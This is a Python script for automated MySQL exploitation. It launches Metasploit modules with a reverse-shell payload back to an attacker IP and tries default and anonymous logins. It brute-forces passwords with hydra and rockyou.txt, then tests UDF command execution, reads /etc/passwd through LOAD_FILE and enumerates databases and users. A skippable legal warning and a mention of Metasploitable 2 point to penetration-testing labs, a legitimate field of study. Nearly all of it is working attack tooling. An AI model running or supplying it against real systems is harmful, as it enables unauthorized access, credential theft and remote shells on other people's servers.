#!/usr/bin/env python3
import json
import subprocess
import requests
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple
import sys
import urllib3
import logging
import shutil

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
ROCKYOU_PATH = Path("/usr/share/wordlists/rockyou.txt")
COMMON_PASSWORDS_PATH = OUTPUT_DIR / "commonpasswords.txt"
USERS_PATH = OUTPUT_DIR / "usernames.txt"
POST_EXPLOITATION_METADATA = OUTPUT_DIR / "post_exploitation_metadata.json"
EXPLOIT_JSON = "{target}_mysql_exploit.json"
EXPLOIT_MD = "{target}_mysql_exploit.md"

DEFAULT_CREDENTIALS = [
    ("root", ""),
    ("admin", "admin"),
    ("root", "root"),
    ("admin", "password"),
    ("mysql", "mysql"),
    ("admin", "admin123"),
    ("user", "user"),
    ("test", "test"),
    ("root", "password"),
    ("root", "toor")
]

def setup_common_passwords() -> None:
    """Create a small commonpasswords.txt if it doesn't exist."""
    if not COMMON_PASSWORDS_PATH.exists():
        OUTPUT_DIR.mkdir(exist_ok=True)
        common_passwords = [
            "password", "admin", "root", "mysql", "admin123", "123456", "toor", "password123", "welcome", "letmein",
            "12345678", "qwerty", "abc123", "password1", "admin1", "mysql", "toor", "password"
        ]
        with COMMON_PASSWORDS_PATH.open("w", encoding='utf-8') as f:
            f.write("\n".join(common_passwords))
        logger.info(f"Created {COMMON_PASSWORDS_PATH}")

def setup_usernames() -> None:
    """Create usernames.txt if it doesn't exist."""
    if not USERS_PATH.exists():
        OUTPUT_DIR.mkdir(exist_ok=True)
        usernames = ["root", "admin", "mysql", "user", "test", "webadmin", "guest"]
        with USERS_PATH.open("w", encoding='utf-8') as f:
            f.write("\n".join(usernames))
        logger.info(f"Created {USERS_PATH}")

def run_command(cmd: List[str], timeout: int = 180, shell: bool = False) -> Tuple[str, bool]:
    """Run a shell command and return its output and success status."""
    cmd_str = cmd if isinstance(cmd, str) else " ".join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout
        )
        return result.stdout.strip(), True
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd_str} - {e.output}")
        return e.output, False
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {cmd_str}")
        return "Command timed out", False
    except Exception as e:
        logger.error(f"Error running command: {cmd_str} - {e}")
        return str(e), False

def run_metasploit_exploit(module: str, rhost: str, rport: str, payload: str, attacker_ip: str, attacker_port: str) -> Tuple[bool, str]:
    """Run a Metasploit exploit module."""
    msf_cmd = [
        "msfconsole", "-q", "-x",
        f"use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run; exit"
    ]
    output, success = run_command(msf_cmd, timeout=600)
    poc = f"msfconsole -q -x 'use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run'"
    if success and ("Meterpreter session" in output or "Shell session" in output):
        logger.info(f"Success: {module} exploited! Check listener.")
        return True, poc
    logger.error(f"Failed: {module} did not exploit.")
    return False, poc

def test_mysql_default_credentials(target: str, port: str) -> Tuple[str, str, str]:
    """Test default credentials for MySQL."""
    for username, password in DEFAULT_CREDENTIALS:
        if password:
            mysql_cmd = f"mysql -h {target} -P {port} -u {username} -p{password} -e 'SELECT 1;'"
        else:
            # Test root with no password (common in Metasploitable 2)
            mysql_cmd = f"mysql -h {target} -P {port} -u {username} -e 'SELECT 1;'"
        
        output, success = run_command(mysql_cmd, shell=True, timeout=30)
        if success and "ERROR" not in output and "Access denied" not in output:
            logger.info(f"Success: {target}:{port} with {username}:{password}")
            if password:
                poc = f"mysql -h {target} -P {port} -u {username} -p{password}"
            else:
                poc = f"mysql -h {target} -P {port} -u {username}"
            return username, password, poc
    logger.error(f"No default credentials worked for {target}:{port}")
    return None, None, ""

def brute_force_mysql(target: str, port: str, use_rockyou: bool) -> Tuple[str, str, str]:
    """Brute-force MySQL credentials using hydra."""
    password_file = ROCKYOU_PATH if use_rockyou and ROCKYOU_PATH.exists() else COMMON_PASSWORDS_PATH
    if not password_file.exists():
        logger.error(f"Password file {password_file} not found. Falling back to default credentials.")
        return None, None, ""
    
    hydra_cmd = f"hydra -L {USERS_PATH} -P {password_file} {target} mysql -s {port} -t 4 -w 10"
    output, success = run_command(hydra_cmd, timeout=600, shell=True)
    if success and "password:" in output:
        match = re.search(r"\[3306\]\[mysql\] host: .* login: (\S+) password: (\S+)", output)
        if match:
            username, password = match.groups()
            logger.info(f"Success: MySQL {target}:{port} with {username}:{password}")
            poc = f"mysql -h {target} -P {port} -u {username} -p{password}"
            return username, password, poc
    logger.error(f"Brute-force failed for {target}:{port}")
    return None, None, ""

def test_mysql_anonymous_access(target: str, port: str) -> Tuple[bool, str]:
    """Test for anonymous MySQL access."""
    mysql_cmd = f"mysql -h {target} -P {port} -u '' -e 'SELECT 1;'"
    output, success = run_command(mysql_cmd, shell=True)
    if success and "ERROR" not in output and "Access denied" not in output:
        logger.info(f"Anonymous MySQL access successful: {target}:{port}")
        poc = f"mysql -h {target} -P {port} -u ''"
        return True, poc
    return False, ""

def test_mysql_udf_injection(target: str, port: str, username: str, password: str) -> Tuple[bool, str]:
    """Test for MySQL UDF injection."""
    # Test if we can create and use UDFs
    udf_test = f"mysql -h {target} -P {port} -u {username} -p{password} -e 'SELECT sys_exec(\"whoami\");'"
    output, success = run_command(udf_test, shell=True)
    if success and "ERROR" not in output:
        logger.info(f"MySQL UDF injection successful: {target}:{port}")
        poc = f"mysql -h {target} -P {port} -u {username} -p{password} -e 'SELECT sys_exec(\"whoami\");'"
        return True, poc
    return False, ""

def test_mysql_file_operations(target: str, port: str, username: str, password: str) -> Tuple[bool, str]:
    """Test MySQL file operations (read/write)."""
    # Test file read
    read_test = f"mysql -h {target} -P {port} -u {username} -p{password} -e 'SELECT LOAD_FILE(\"/etc/passwd\");'"
    output, success = run_command(read_test, shell=True)
    if success and "root:" in output:
        logger.info(f"MySQL file read successful: {target}:{port}")
        poc = f"mysql -h {target} -P {port} -u {username} -p{password} -e 'SELECT LOAD_FILE(\"/etc/passwd\");'"
        return True, poc
    return False, ""

def test_mysql_privilege_escalation(target: str, port: str, username: str, password: str) -> Tuple[bool, str]:
    """Test for MySQL privilege escalation."""
    # Check if user has SUPER privilege
    priv_test = f"mysql -h {target} -P {port} -u {username} -p{password} -e 'SHOW GRANTS;'"
    output, success = run_command(priv_test, shell=True)
    if success and "SUPER" in output:
        logger.info(f"MySQL SUPER privilege found: {target}:{port}")
        poc = f"mysql -h {target} -P {port} -u {username} -p{password} -e 'SHOW GRANTS;'"
        return True, poc
    return False, ""

def test_mysql_database_enumeration(target: str, port: str, username: str, password: str) -> List[Dict]:
    """Enumerate MySQL databases and tables."""
    vulnerabilities = []
    
    # List databases
    db_cmd = f"mysql -h {target} -P {port} -u {username} -p{password} -e 'SHOW DATABASES;'"
    output, success = run_command(db_cmd, shell=True)
    if success and "ERROR" not in output:
        vulnerabilities.append({
            "type": "Database Enumeration",
            "target": f"{target}:{port}",
            "details": "Databases enumerated successfully",
            "poc": f"mysql -h {target} -P {port} -u {username} -p{password} -e 'SHOW DATABASES;'"
        })
    
    # List users
    user_cmd = f"mysql -h {target} -P {port} -u {username} -p{password} -e 'SELECT User, Host FROM mysql.user;'"
    output, success = run_command(user_cmd, shell=True)
    if success and "ERROR" not in output:
        vulnerabilities.append({
            "type": "User Enumeration",
            "target": f"{target}:{port}",
            "details": "MySQL users enumerated successfully",
            "poc": f"mysql -h {target} -P {port} -u {username} -p{password} -e 'SELECT User, Host FROM mysql.user;'"
        })
    
    return vulnerabilities

def test_mysql_version_exploits(target: str, port: str, version: str) -> List[Dict]:
    """Test version-specific MySQL exploits."""
    vulnerabilities = []
    
    # Test for specific version vulnerabilities
    if "5.0" in version or "5.1" in version:
        vulnerabilities.append({
            "type": "Version Vulnerability",
            "target": f"{target}:{port}",
            "details": f"MySQL {version} may have known vulnerabilities",
            "poc": f"mysql -h {target} -P {port} -u root -p"
        })
    
    return vulnerabilities

def save_metadata(exploits: List[Dict], target: str, port: str) -> None:
    """Save exploitation metadata to JSON."""
    metadata = {"target": target, "port": port, "successful_exploits": exploits}
    OUTPUT_DIR.mkdir(exist_ok=True)
    with POST_EXPLOITATION_METADATA.open("w", encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)
    logger.info(f"Saved exploitation metadata to {POST_EXPLOITATION_METADATA}")

def save_exploit_report(exploits: List[Dict], target: str, port: str) -> None:
    """Save exploit report to JSON and Markdown."""
    json_path = OUTPUT_DIR / EXPLOIT_JSON.format(target=target)
    md_path = OUTPUT_DIR / EXPLOIT_MD.format(target=target)
    metadata = {"target": target, "port": port, "successful_exploits": exploits}
    
    # Save JSON
    with json_path.open("w", encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)
    logger.info(f"Saved exploit JSON to {json_path}")
    
    # Save Markdown
    lines = [f"# MySQL Exploit Report for {target}:{port}\n"]
    lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    for exploit in exploits:
        lines.append(f"## {exploit['type']}\n")
        lines.append(f"- **Target**: {exploit['target']}\n")
        lines.append(f"- **Details**: {exploit['details']}\n")
        lines.append(f"- **PoC**: `{exploit['poc']}`\n\n")
        if "shell_paths" in exploit:
            lines.append("### Shell Paths\n")
            for path in exploit["shell_paths"]:
                lines.append(f"- {path}\n")
        if "failed_attempts" in exploit:
            lines.append("### Failed Attempts\n")
            for attempt in exploit["failed_attempts"]:
                lines.append(f"- {attempt}\n")
    
    with md_path.open("w", encoding='utf-8') as f:
        f.write("\n".join(lines))
    logger.info(f"Saved exploit Markdown to {md_path}")

def exploit_target(metadata: Dict, target: str, port: str, attacker_ip: str, attacker_port: str, use_rockyou: bool) -> List[Dict]:
    """Exploit MySQL vulnerabilities to gain access."""
    success = False
    exploits = []
    failed_attempts = []

    logger.info(f"Starting MySQL exploitation on {target}:{port}")
    logger.info(f"Using {'rockyou.txt' if use_rockyou else 'commonpasswords.txt'} for brute force")

    setup_common_passwords()
    setup_usernames()

    # Test Metasploit exploits
    logger.info("Checking Metasploit exploits...")
    for mods_key in ["msf_exploit_mods"]:
        if mods_key in metadata and metadata[mods_key] != ["none"]:
            for module in metadata[mods_key]:
                logger.debug(f"Trying Metasploit module: {module}")
                if "local" not in module:
                    msf_success, msf_poc = run_metasploit_exploit(module, target, port, "generic/shell_reverse_tcp", attacker_ip, attacker_port)
                    if msf_success:
                        success = True
                        exploits.append({
                            "type": "Metasploit",
                            "target": f"{target}:{port}",
                            "details": f"Module {module} exploited",
                            "poc": msf_poc
                        })
                    else:
                        failed_attempts.append(f"Metasploit module {module} on {target}:{port}")

    # Test anonymous access
    logger.info("Testing anonymous access...")
    anon_success, anon_poc = test_mysql_anonymous_access(target, port)
    if anon_success:
        success = True
        exploits.append({
            "type": "Anonymous Access",
            "target": f"{target}:{port}",
            "details": "Anonymous MySQL access successful",
            "poc": anon_poc
        })
    else:
        failed_attempts.append(f"Anonymous access test on {target}:{port}")

    # Test default credentials
    logger.info("Testing default credentials...")
    username, password, cred_poc = test_mysql_default_credentials(target, port)
    if username:
        success = True
        exploits.append({
            "type": "Default Credentials",
            "target": f"{target}:{port}",
            "details": f"Credentials {username}:{password}",
            "poc": cred_poc
        })
    else:
        failed_attempts.append(f"Default credentials test on {target}:{port}")

    # Test brute force
    logger.info("Attempting brute force...")
    bf_username, bf_password, bf_poc = brute_force_mysql(target, port, use_rockyou)
    if bf_username:
        success = True
        exploits.append({
            "type": "Brute Force",
            "target": f"{target}:{port}",
            "details": f"Credentials {bf_username}:{bf_password} ({'rockyou.txt' if use_rockyou else 'commonpasswords.txt'})",
            "poc": bf_poc
        })
    else:
        failed_attempts.append(f"Brute force with {'rockyou.txt' if use_rockyou else 'commonpasswords.txt'} on {target}:{port}")

    # Test additional vulnerabilities for successful logins
    for exploit in exploits:
        if exploit["type"] in ["Default Credentials", "Brute Force", "Anonymous Access"]:
            # Extract credentials from PoC
            if "mysql -h" in exploit["poc"]:
                match = re.search(r"-u (\S+) -p(\S+)", exploit["poc"])
                if match:
                    username, password = match.groups()
                    
                    # Test UDF injection
                    udf_success, udf_poc = test_mysql_udf_injection(target, port, username, password)
                    if udf_success:
                        exploits.append({
                            "type": "UDF Injection",
                            "target": f"{target}:{port}",
                            "details": f"UDF injection with {username}:{password}",
                            "poc": udf_poc
                        })
                    
                    # Test file operations
                    file_success, file_poc = test_mysql_file_operations(target, port, username, password)
                    if file_success:
                        exploits.append({
                            "type": "File Operations",
                            "target": f"{target}:{port}",
                            "details": f"File read with {username}:{password}",
                            "poc": file_poc
                        })
                    
                    # Test privilege escalation
                    priv_success, priv_poc = test_mysql_privilege_escalation(target, port, username, password)
                    if priv_success:
                        exploits.append({
                            "type": "Privilege Escalation",
                            "target": f"{target}:{port}",
                            "details": f"SUPER privilege with {username}:{password}",
                            "poc": priv_poc
                        })
                    
                    # Test database enumeration
                    enum_vulns = test_mysql_database_enumeration(target, port, username, password)
                    for vuln in enum_vulns:
                        exploits.append(vuln)

    # Test version-specific exploits
    if "mysql_raw_banner" in metadata:
        version = metadata["mysql_raw_banner"]
        version_vulns = test_mysql_version_exploits(target, port, version)
        for vuln in version_vulns:
            exploits.append(vuln)

    exploits.append({"failed_attempts": failed_attempts})

    if not success:
        logger.error("No MySQL vulnerabilities successfully exploited.")
    else:
        logger.info("MySQL exploitation completed successfully.")

    return exploits

def find_metadata_file(target: str) -> Tuple[Path, str]:
    """Find the first MySQL metadata file for the target and extract port."""
    metadata_files = list(OUTPUT_DIR.glob(f"{target}_mysql_*_metadata.json"))
    if not metadata_files:
        logger.error(f"No MySQL metadata files found for {target}. Expected pattern: {OUTPUT_DIR}/{target}_mysql_*_metadata.json")
        return None, ""
    
    metadata_file = metadata_files[0]
    logger.info(f"Found metadata file: {metadata_file}")
    
    try:
        with metadata_file.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
        port = metadata.get("port", "3306")  # Default to 3306 if port not in metadata
        logger.info(f"Using port {port} from metadata")
        return metadata_file, port
    except json.JSONDecodeError as e:
        logger.error(f"Error decoding {metadata_file}: {e}")
        port = "3306"
        logger.info(f"Falling back to default port {port}")
        return metadata_file, port
    except Exception as e:
        logger.error(f"Error reading {metadata_file}: {e}")
        return None, ""

def main():
    """Main function to parse arguments and run exploits."""
    parser = argparse.ArgumentParser(description="Automated MySQL exploitation script")
    parser.add_argument("target", help="Target domain or IP (e.g., 192.168.1.35)")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for reverse shells")
    parser.add_argument("--attacker-port", default="4444", help="Attacker port for reverse shells")
    parser.add_argument("--use-rockyou", action="store_true", help="Use rockyou.txt for brute-forcing")
    parser.add_argument("--no-confirm", action="store_true", help="Skip user confirmation")
    args = parser.parse_args()

    # Legal warning
    if not args.no_confirm:
        logger.warning("This script is for authorized penetration testing only. Unauthorized exploitation is illegal and unethical.")
        confirm = input("[?] Proceed? (y/n): ")
        if confirm.lower() != "y":
            logger.info("Exiting...")
            sys.exit(0)

    # Check dependencies
    logger.info("Checking dependencies...")
    for tool in ["hydra", "mysql", "msfconsole"]:
        if not shutil.which(tool):
            logger.error(f"{tool} not found. Install it (e.g., sudo apt install {tool.replace('msfconsole', 'metasploit-framework')}).")
            sys.exit(1)

    # Find MySQL metadata file
    json_path, port = find_metadata_file(args.target)
    if not json_path or not port:
        logger.error(f"Failed to find MySQL metadata file for {args.target}. Ensure recon.py ran successfully.")
        sys.exit(1)

    # Load metadata
    try:
        with json_path.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
    except json.JSONDecodeError as e:
        logger.error(f"Error decoding {json_path}: {e}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Error loading {json_path}: {e}")
        sys.exit(1)

    # Run exploits
    logger.info(f"Starting exploitation for {args.target}:{port}...")
    exploits = exploit_target(metadata, args.target, port, args.attacker_ip, args.attacker_port, args.use_rockyou)

    # Save results
    save_metadata(exploits, args.target, port)
    save_exploit_report(exploits, args.target, port)
    logger.info("MySQL exploitation complete.")

if __name__ == "__main__":
    main() 